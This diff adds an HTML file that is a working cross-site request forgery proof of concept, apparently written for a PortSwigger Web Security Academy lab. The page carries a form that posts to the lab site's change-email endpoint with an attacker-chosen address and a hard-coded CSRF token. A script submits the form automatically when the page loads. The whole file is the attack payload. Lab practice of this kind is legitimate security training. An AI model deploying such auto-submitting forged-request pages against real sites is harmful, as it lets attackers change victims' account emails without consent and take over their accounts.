@@ -1,0 +1,26 @@
+<html>
+  <form
+    id="csrf-form"
+    enctype="application/x-www-form-urlencoded"
+    method="POST"
+    action="https://0a4000c903f1cbcbc0ee29bd004d000f.web-security-academy.net/my-account/change-email"
+  >
+    <table>
+      <tr>
+        <td>email</td>
+        <td><input type="text" value="test@test2.com" name="email" /></td>
+      </tr>
+      <tr>
+        <td>csrf</td>
+        <td><input type="text" value="2vfJF33QnDA4PpMHtDJm9ghvyJwDyF00" name="csrf" /></td>
+      </tr>
+    </table>
+    <input
+      type="submit"
+      value="https://0a4000c903f1cbcbc0ee29bd004d000f.web-security-academy.net/my-account/change-email"
+    />
+  </form>
+  <script>
+    document.getElementById("csrf-form").submit();
+  </script>
+</html>
